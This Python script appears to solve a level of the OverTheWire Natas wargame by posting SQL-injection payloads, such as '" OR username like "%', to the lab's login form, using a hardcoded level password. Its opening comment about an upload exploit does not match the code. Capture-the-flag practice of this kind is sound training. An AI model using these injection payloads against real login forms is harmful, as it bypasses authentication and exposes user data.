#!/usr/local/bin/python3

import requests

# We need to exploit the upload function. We can add anything that'll run in
# apache user permissions dont let us look outside of the dir

NATAS = "natas14"
PASS = 'Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1'
URL = "http://" + NATAS + ".natas.labs.overthewire.org/?debug=True"

# $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\"
  # and password=\"".$_REQUEST["password"]."\"";

payload = {'username': 'jack_russell', 'password': '{0}'.format('"; select * from users where "True"="True')}
payload = {'username': '', 'password': '" OR username like "%'}
r = requests.post(URL, auth=(NATAS, PASS), data=payload)
# getUrl = re.findall('<\s*a[^>]*>(.*?)<\s*/\s*a>', str(r.text))
# firefox = webbrowser.get('firefox')

# firefox.open_new_tab('{0}{1}{2}{3}'.format(URL, '/', getUrl[0], '?Debug=true'))
# subprocess.call(['firefox', URL, '/', getUrl[0]])
# print(getUrl[0])
print(r.text)
# print(r.history)
print(r.status_code)
# print(r.headers)
